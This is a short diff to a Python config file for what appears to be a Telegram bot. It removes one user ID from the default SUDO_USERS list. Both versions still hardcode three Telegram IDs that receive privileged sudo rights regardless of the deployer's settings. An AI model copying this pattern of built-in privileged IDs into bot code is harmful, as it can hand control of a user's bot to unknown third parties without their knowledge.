@@ -30,7 +30,7 @@ TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))
 
 try:
     SUDO_USERS = [1993048420, 5743248220, 1214348787]
-    for x in (os.environ.get("SUDO_USERS", "1993048420 5743248220 1214348787 6321064549").split()):
+    for x in (os.environ.get("SUDO_USERS", "1993048420 5743248220 1214348787").split()):
         SUDO_USERS.append(int(x))
 except ValueError:
     raise Exception("Your SUDO_USERS list does not contain valid integers.")
